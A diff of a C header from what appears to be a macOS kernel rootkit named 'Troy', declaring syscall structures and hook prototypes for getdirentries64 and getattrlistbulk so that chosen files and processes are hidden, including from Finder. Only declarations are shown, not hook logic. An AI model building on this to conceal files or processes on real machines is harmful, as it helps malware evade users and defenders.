@@ -23,14 +23,15 @@ struct	proc_yousemite
     LIST_ENTRY(proc_yousemite) p_list;
 };
 
-//from https://github.com/rc0r/FileHider/blob/master/FileHider/FileHider.h
+//the following three structures come from sysproto.h from Kernel.framework
+//-----------------BEGIN------------------------
 struct getdirentries64_args {
     int fd;
     user_addr_t bufp;
     user_size_t bufsize;
     user_addr_t position;
 };
-struct getdirentriesattr_args {
+/*struct getdirentriesattr_args {
     int fd;
     user_addr_t alist;
     user_addr_t buffer;
@@ -39,8 +40,26 @@ struct getdirentriesattr_args {
     user_addr_t basep;
     user_addr_t newstate;
     user_ulong_t options;
+};*/
+
+struct getattrlist_args
+{
+    user_addr_t path;
+    user_addr_t alist;
+    user_addr_t attributeBuffer;
+    user_size_t bufferSize;
+    user_ulong_t option;
 };
 
+struct getattrlistbulk_args
+{
+    int dirfd;
+    user_addr_t alist;
+    user_addr_t attributeBuffer;
+    user_size_t bufferSize;
+    uint64_t options;
+};
+//-----------------END------------------------
 
 struct hide_proc
 {
@@ -65,13 +84,21 @@ TAILQ_HEAD(hide_file_dirent_list, hide_file_dirent);
 typedef int (*getdirentries64_function_prototype)(struct proc *p,
                                                   struct getdirentries64_args *uap,
                                                   user_ssize_t *retval);
-typedef int (*getdirentriesattr_function_prototype)(struct proc *p,
+/*typedef int (*getdirentriesattr_function_prototype)(struct proc *p,
                                                     struct getdirentriesattr_args *uap,
-                                                    int32_t *retval);
+                                                    int32_t *retval);*/
+typedef int (*getattrlist_function_prototype)(struct proc * p,
+                                              struct getattrlist_args *uap,
+                                              int32_t *retval);
+//for hide file in finder
+//this function is a complete new funtion, and only support on Yousemite.
+typedef int (*getattrlistbulk_function_prototype)(proc_t p,
+                               struct getattrlistbulk_args *uap,
+                               int32_t *retval);
 
 int hide_given_directory(troy_hide_object *directory_hide);
 errno_t hide_given_process(troy_hide_object *process_hide);
 int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval);
-int my_getdirentriesattr_callback(struct proc *p,struct getdirentriesattr_args *uap, int32_t *retval);
+int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap,int32_t *retval);
 
 #endif /* defined(__Troy__HookCAPI__) */
